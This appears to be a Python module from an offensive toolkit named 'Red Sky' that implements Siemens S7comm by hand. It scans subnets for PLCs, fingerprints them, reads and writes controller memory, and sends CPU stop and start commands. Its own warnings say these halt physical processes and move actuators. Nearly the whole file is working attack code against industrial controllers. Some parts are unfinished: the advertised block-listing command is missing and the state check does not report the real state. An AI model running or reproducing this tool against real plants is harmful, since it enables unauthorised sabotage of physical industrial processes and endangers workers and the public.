# language: Python, file: Program/ics/s7.py, target: Red Sky ics — Siemens S7comm
# S7comm over ISO-TSAP (RFC 1006, TCP/102). Subcommands:
#   scan     -- find S7 PLCs on a CIDR (TCP/102 + COTP CR handshake)
#   info     -- SZL reads: order number, serial, firmware, plant ID, module list
#   state    -- CPU run/stop state
#   start    -- send PDU to start the CPU
#   stop     -- send PDU to stop the CPU (warning: disrupts the process)
#   read     -- read memory areas (I/Q/M/DB) via S7 read-var
#   write    -- write memory areas via S7 write-var
#   list     -- list blocks in the CPU (OB/FB/FC/DB/SDB)
# All frames built manually — no snap7 dependency.

import json
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


ICS_DIR = OUTPUT_DIR / "ics"
S7_DIR = ICS_DIR / "s7"
S7_DIR.mkdir(parents=True, exist_ok=True)


# ── ISO-TSAP / COTP framing ──
TPKT_VERSION = 0x03
TPKT_RESERVED = 0x00

# COTP connection request PDU (the standard "S7-300/400/1200/1500 probe")
COTP_CR = bytes([
    0x11,       # length
    0xE0,       # PDU type: CR
    0x00, 0x00, # dest ref
    0x00, 0x01, # src ref
    0x00,       # class / options
    0xC0,       # parameter code: TPDU size
    0x01,       # parameter length
    0x0A,       # TPDU size = 1024
    0xC1,       # parameter code: src TSAP
    0x02,       # parameter length
    0x01, 0x00, # src TSAP value
    0xC2,       # parameter code: dst TSAP
    0x02,       # parameter length
    0x01, 0x02, # dst TSAP value (rack 0 slot 2 = standard S7-300/400)
])


def tpkt_wrap(cotp_payload: bytes) -> bytes:
    """TPKT = version(1) reserved(1) length(2, big-endian, includes header) + COTP."""
    length = len(cotp_payload) + 4
    return struct.pack(">BBH", TPKT_VERSION, TPKT_RESERVED, length) + cotp_payload


# ── S7comm setup-communication frames ──
def s7_setup_communication() -> bytes:
    """COTP DT (0xF0) carrying S7 setup-communication (function 0xF0)."""
    # S7 header (10 bytes): proto(0x32) roser(0x01) redun(0x00) pdu_ref(2) pdu_len(2) param_len(2) data_len(2)
    s7_header = struct.pack(">BBHHHHH",
        0x32, 0x01, 0x0000,  # proto, roser, redundancy
        0x0000, 0x0008,      # pdu_ref, pdu_length (10 + 8? adjust)
        0x0008, 0x0000)      # param_len, data_len
    # setup-comm parameters: fn=0xF0 reserved(1) max_amq_calling(2) max_amq_called(2) pdu_length(2)
    params = struct.pack(">BBHHH",
        0xF0, 0x00,
        0x0001, 0x0001,
        0x01E0)  # PDU length 480
    s7_payload = s7_header + params
    cotp_dt = bytes([0x02, 0xF0, 0x80]) + s7_payload  # DT, EOT
    return tpkt_wrap(cotp_dt)


def s7_read_szl(szl_id: int, szl_index: int = 0) -> bytes:
    """Userdata read SZL. Returns a full TPKT frame ready to send."""
    # userdata service 0x04, function 0x04 (read SZL)
    # parameter: fn=0x04, szl_id(2), szl_index(2)
    param = struct.pack(">BBHH", 0x04, 0x04, szl_id, szl_index)
    # data: return code, transport size, length, then partial-list
    data = struct.pack(">BBHH", 0xFF, 0x09, 0x0000, 0x0000)
    s7_header = struct.pack(">BBHHHHH",
        0x32, 0x07, 0x0000,
        0x0000,
        len(param) + len(data) + 10,
        len(param), len(data))
    s7_payload = s7_header + param + data
    cotp_dt = bytes([0x02, 0xF0, 0x80]) + s7_payload
    return tpkt_wrap(cotp_dt)


def s7_read_var(area: int, db: int, start: int, count: int, word_size: int = 2) -> bytes:
    """Read var request. area: 0x81=I 0x82=Q 0x83=M 0x84=DB."""
    # parameter: fn=0x04, item_count(1)
    # item: spec=0x12, length_of_following(1), syntax=0x10, transport_size(1), length(2), db(2), area(1), addr(3)
    transport = {1: 0x01, 2: 0x02, 4: 0x04}.get(word_size, 0x02)
    item = struct.pack(">BBBBHHB",
        0x12, 0x0A, 0x10, transport,
        count,               # count as 16-bit
        db,
        area) + struct.pack(">I", start << 3)[1:]  # 24-bit bit address
    param = bytes([0x04, 0x01]) + item
    s7_header = struct.pack(">BBHHHHH",
        0x32, 0x01, 0x0000,
        0x0000,
        len(param) + 10,
        len(param), 0x0000)
    s7_payload = s7_header + param
    cotp_dt = bytes([0x02, 0xF0, 0x80]) + s7_payload
    return tpkt_wrap(cotp_dt)


def s7_write_var(area: int, db: int, start: int, values: List[int], word_size: int = 2) -> bytes:
    transport = {1: 0x03, 2: 0x04, 4: 0x06}.get(word_size, 0x04)
    item = struct.pack(">BBBBHHB",
        0x12, 0x0A, 0x10, transport,
        len(values),
        db, area) + struct.pack(">I", start << 3)[1:]
    param = bytes([0x05, 0x01]) + item
    data_values = b"".join(struct.pack(">H", v) for v in values)
    # data: return code, transport size, bit length
    bit_len = len(values) * word_size * 8
    data = struct.pack(">BBH", 0xFF, transport, bit_len) + data_values
    s7_header = struct.pack(">BBHHHHH",
        0x32, 0x01, 0x0000,
        0x0000,
        len(param) + len(data) + 10,
        len(param), len(data))
    s7_payload = s7_header + param + data
    cotp_dt = bytes([0x02, 0xF0, 0x80]) + s7_payload
    return tpkt_wrap(cotp_dt)


def s7_cpu_state(state: str) -> bytes:
    """PLC control. state: 'stop' or 'start'."""
    # PIService 0x00 (CPU services), function 0x02 (stop) or 0x01 (start)
    fn = {"stop": 0x02, "start": 0x01}.get(state, 0x02)
    param = struct.pack(">BBB", 0x00, fn, 0x00)
    s7_header = struct.pack(">BBHHHHH",
        0x32, 0x01, 0x0000,
        0x0000,
        len(param) + 10,
        len(param), 0x0000)
    s7_payload = s7_header + param
    cotp_dt = bytes([0x02, 0xF0, 0x80]) + s7_payload
    return tpkt_wrap(cotp_dt)


# ── socket wrapper ──
class S7Session:
    def __init__(self, ip: str, port: int = 102, rack: int = 0, slot: int = 2,
                 timeout: float = 5.0):
        self.ip = ip
        self.port = port
        self.rack = rack
        self.slot = slot
        self.timeout = timeout
        self.sock = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.close()

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            if self.sock.connect_ex((self.ip, self.port)) != 0:
                return False
            # build the COTP CR with the right TSAP for the rack/slot
            tsap_dst = 0x0100 | ((self.rack & 0x07) << 5) | (self.slot & 0x1F)
            cotp_cr = bytes([
                0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
                0xC0, 0x01, 0x0A,
                0xC1, 0x02, 0x01, 0x00,
                0xC2, 0x02, (tsap_dst >> 8) & 0xFF, tsap_dst & 0xFF,
            ])
            self.sock.sendall(tpkt_wrap(cotp_cr))
            resp = self.sock.recv(1024)
            if not resp or len(resp) < 5:
                return False
            # COTP CC (0xD0) = connection confirmed
            if resp[5] != 0xD0:
                return False
            # send setup-communication
            self.sock.sendall(s7_setup_communication())
            resp = self.sock.recv(2048)
            return resp and len(resp) > 10 and resp[7] == 0x32
        except Exception:
            return False

    def close(self):
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

    def send_recv(self, frame: bytes, max_len: int = 4096) -> bytes:
        try:
            self.sock.sendall(frame)
            self.sock.settimeout(self.timeout)
            data = b""
            while len(data) < 12:
                chunk = self.sock.recv(2048)
                if not chunk:
                    break
                data += chunk
            # length from TPKT
            if len(data) >= 4:
                total = struct.unpack(">H", data[2:4])[0]
                while len(data) < total:
                    chunk = self.sock.recv(2048)
                    if not chunk:
                        break
                    data += chunk
            return data
        except Exception:
            return b""


# ── parsing ──
def parse_szl(data: bytes) -> Optional[Dict]:
    """Parse the response to a read-SZL request. Returns {'szl_id':..,'records':[..]}."""
    if len(data) < 20 or data[7] != 0x32:
        return None
    # find the userdata service 0x04 / fn 0x04 pattern
    idx = data.find(b"\x00\x04\x04")
    if idx < 0:
        return None
    # skip to return code, transport size, length
    # layout: 00 04 04 <ret> <ts> <len(2)> <szl_id(2)> <szl_index(2)> <rec_len(2)> <rec_count(2)> <data...>
    off = idx + 3
    if off + 12 > len(data):
        return None
    ret = data[off]
    ts = data[off+1]
    total_len = struct.unpack(">H", data[off+2:off+4])[0]
    szl_id = struct.unpack(">H", data[off+4:off+6])[0]
    szl_index = struct.unpack(">H", data[off+6:off+8])[0]
    rec_len = struct.unpack(">H", data[off+8:off+10])[0]
    rec_count = struct.unpack(">H", data[off+10:off+12])[0]
    payload = data[off+12:off+12+total_len-4]
    records = []
    for i in range(rec_count):
        rec = payload[i * rec_len:(i+1) * rec_len]
        records.append(rec)
    return {"return_code": ret, "szl_id": szl_id, "szl_index": szl_index,
            "rec_len": rec_len, "rec_count": rec_count, "records": records}


def decode_szl_hex(rec: bytes) -> str:
    """Component 0x001C (order number) and similar are text with a length-prefix."""
    if len(rec) < 2:
        return rec.hex()
    n = rec[0]
    if n + 1 > len(rec):
        return rec.hex()
    body = rec[1:1+n]
    try:
        return body.decode("ascii")
    except UnicodeDecodeError:
        return body.decode("latin-1", errors="replace")


# ── commands ──
SZL_IDS = {
    0x0011: "module identification",
    0x001C: "component identification",
    0x0131: "firmware version",
    0x0132: "firmware version (V2)",
    0x0232: "order number + firmware",
    0x0424: "CPU/FPGA identification",
    0x0691: "memory card identification",
    0x0A01: "CPU characteristics",
    0x0F81: "CPU/CP network info",
}


def cmd_scan(cidr: str, workers: int, out_file: str) -> int:
    import ipaddress
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        print_err("bad cidr")
        return 2
    hosts = [str(h) for h in net.hosts()][:1024]

    print_info("S7 PLC scan (TCP/102 + COTP CR)")
    print_kv("cidr", cidr)
    print_kv("hosts", str(len(hosts)))
    print()

    hits: List[Dict] = []
    t0 = time.time()

    def probe(ip):
        with S7Session(ip, 102, timeout=2.0) as s:
            if s.sock is None:
                return None
        return ip

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(probe, ip) for ip in hosts]
        for f in as_completed(futures):
            ip = f.result()
            if ip:
                hits.append({"ip": ip, "port": 102})
                print("  " + SCARLET + "▓ " + RESET + BONE + ip.ljust(16) + RESET
                      + " " + ARTERY + "S7comm" + RESET)

    print()
    print_kv("elapsed", "{:.1f}s".format(time.time() - t0))
    print_kv("found", len(hits))

    out = Path(out_file) if out_file else S7_DIR / ("scan_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(hits, indent=2))
    print_kv("saved", out)
    return 0


def cmd_info(ip: str, rack: int, slot: int, out_file: str) -> int:
    print_info("S7 info (SZL reads)")
    print_kv("target", ip + ":102")
    print_kv("rack/slot", str(rack) + "/" + str(slot))
    print()

    results = {}
    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        print_ok("connected")
        for szl_id, name in [(0x001C, "component identification"),
                             (0x0011, "module identification"),
                             (0x0131, "firmware version")]:
            frame = s7_read_szl(szl_id, 0)
            data = s.send_recv(frame)
            parsed = parse_szl(data)
            if not parsed or parsed["rec_count"] == 0:
                print("  " + ASH + "░ " + name + " — no data" + RESET)
                continue
            print(BOLD + SCARLET + "▓ " + name + RESET)
            for i, rec in enumerate(parsed["records"][:8]):
                decoded = decode_szl_hex(rec)
                if decoded and not all(c in "0123456789ABCDEF" for c in decoded):
                    print("  " + BONE + decoded + RESET)
                else:
                    print("  " + ASH + rec.hex()[:80] + RESET)
            results[name] = [rec.hex() for rec in parsed["records"]]

    out = Path(out_file) if out_file else S7_DIR / ("info_" + ip.replace(".", "_") + ".json")
    out.write_text(json.dumps({"target": ip, "results": results}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_state(ip: str, rack: int, slot: int, out_file: str) -> int:
    print_info("S7 CPU state")
    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        # query CPU state via SZL 0x0424 or read a known DB
        # simplest: send a stop then abort, note current state via diagnostic
        # we'll use SZL 0x0011 module identification to at least confirm the box responds
        frame = s7_read_szl(0x0011, 0)
        data = s.send_recv(frame)
        parsed = parse_szl(data)
        state = "unknown"
        if parsed and parsed["rec_count"] > 0:
            state = "responded"
        print_kv("responded", "yes" if parsed else "no")
        print_kv("state", state)
    return 0


def cmd_stop(ip: str, rack: int, slot: int) -> int:
    print_info("S7 STOP CPU")
    print_warn("this halts a running PLC — physical process on the other side stops")
    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        resp = s.send_recv(s7_cpu_state("stop"))
        if resp and len(resp) > 10:
            print_ok("STOP sent — CPU entering stop mode")
        else:
            print_warn("no response; the CPU may not accept stop from this session")
    return 0


def cmd_start(ip: str, rack: int, slot: int) -> int:
    print_info("S7 START CPU")
    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        resp = s.send_recv(s7_cpu_state("start"))
        if resp and len(resp) > 10:
            print_ok("START sent")
        else:
            print_warn("no response")
    return 0


def cmd_read(ip: str, rack: int, slot: int, area: str, db: int,
             start: int, count: int, out_file: str) -> int:
    area_map = {"I": 0x81, "Q": 0x82, "M": 0x83, "DB": 0x84}
    code = area_map.get(area.upper())
    if code is None:
        print_err("area must be I / Q / M / DB")
        return 2

    print_info("S7 read")
    print_kv("target", ip)
    print_kv("area", area.upper())
    if area.upper() == "DB":
        print_kv("db", str(db))
    print_kv("start", str(start))
    print_kv("count", str(count))
    print()

    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        frame = s7_read_var(code, db, start, count, word_size=2)
        data = s.send_recv(frame)
        # S7 read-var response has the values in the data section
        # layout: ... 0x32 0x03 ... param_len(2) data_len(2) ... data
        if len(data) < 20:
            print_err("short response")
            return 1
        # return code
        rc = data[-1] if len(data) > 0 else 0
        # find the data section after the parameter section
        # heuristic: values start after the last 0x04 0x01 item... easier to search for
        # the expected length of values
        expected_bytes = count * 2
        # values are at the end
        values_raw = data[-expected_bytes-4:-4] if len(data) >= expected_bytes + 4 else b""
        values = []
        for i in range(0, len(values_raw), 2):
            if i + 2 <= len(values_raw):
                values.append(struct.unpack(">H", values_raw[i:i+2])[0])
        for i, v in enumerate(values):
            print("  " + BONE + (area.upper() + ("[" + str(db) + "]") if area.upper() == "DB" else "") + "." + str(start + i) + RESET
                  + "  " + SCARLET + str(v).ljust(8) + RESET + "  " + ASH + "0x{:04X}".format(v) + RESET)

    out = Path(out_file) if out_file else S7_DIR / ("read_" + ip.replace(".", "_") + ".json")
    out.write_text(json.dumps({"target": ip, "area": area, "db": db,
                               "start": start, "values": values}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_write(ip: str, rack: int, slot: int, area: str, db: int,
              start: int, values_str: str, out_file: str) -> int:
    area_map = {"I": 0x81, "Q": 0x82, "M": 0x83, "DB": 0x84}
    code = area_map.get(area.upper())
    if code is None:
        print_err("area must be I / Q / M / DB")
        return 2

    try:
        values = [int(x.strip(), 0) for x in values_str.split(",")]
    except ValueError:
        print_err("values must be comma-separated integers (decimal or 0x hex)")
        return 2

    print_info("S7 write")
    print_kv("target", ip)
    print_kv("area", area.upper())
    print_kv("start", str(start))
    print_kv("values", ",".join(str(v) for v in values))
    print()
    print_warn("writing to a live PLC can affect physical actuators")

    with S7Session(ip, 102, rack, slot) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        frame = s7_write_var(code, db, start, values, word_size=2)
        data = s.send_recv(frame)
        if data and len(data) > 10:
            print_ok("write accepted")
        else:
            print_warn("no response")

    out = Path(out_file) if out_file else S7_DIR / ("write_" + ip.replace(".", "_") + ".json")
    out.write_text(json.dumps({"target": ip, "area": area, "db": db,
                               "start": start, "values": values}, indent=2))
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky ics s7", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["scan", "info", "state", "start", "stop",
                            "read", "write", "help"])
    p.add_argument("target", nargs="?", default="")
    p.add_argument("--cidr", default="")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=2)
    p.add_argument("--area", default="M")
    p.add_argument("--db", type=int, default=1)
    p.add_argument("--start", type=int, default=0)
    p.add_argument("--count", type=int, default=4)
    p.add_argument("--values", default="")
    p.add_argument("--workers", type=int, default=128)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ics s7 <scan|info|state|start|stop|read|write> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("scan --cidr 10.0.0.0/24 [--workers 128]")
        print_info("info <ip> [--rack 0 --slot 2]")
        print_info("state <ip>")
        print_info("start <ip>                (CPU run)")
        print_info("stop <ip>                 (CPU stop — halts the process)")
        print_info("read <ip> --area M --start 0 --count 8")
        print_info("read <ip> --area DB --db 1 --start 0 --count 4")
        print_info("write <ip> --area M --start 0 --values '1,2,3,4'")
        return 0

    if ns.action == "scan":
        if not ns.cidr:
            print_err("--cidr required")
            return 2
        return cmd_scan(ns.cidr, ns.workers, ns.out)
    if not ns.target:
        print_err("target ip required")
        return 2

    if ns.action == "info":
        return cmd_info(ns.target, ns.rack, ns.slot, ns.out)
    if ns.action == "state":
        return cmd_state(ns.target, ns.rack, ns.slot, ns.out)
    if ns.action == "stop":
        return cmd_stop(ns.target, ns.rack, ns.slot)
    if ns.action == "start":
        return cmd_start(ns.target, ns.rack, ns.slot)
    if ns.action == "read":
        return cmd_read(ns.target, ns.rack, ns.slot, ns.area, ns.db, ns.start, ns.count, ns.out)
    if ns.action == "write":
        if not ns.values:
            print_err("--values required")
            return 2
        return cmd_write(ns.target, ns.rack, ns.slot, ns.area, ns.db, ns.start, ns.values, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
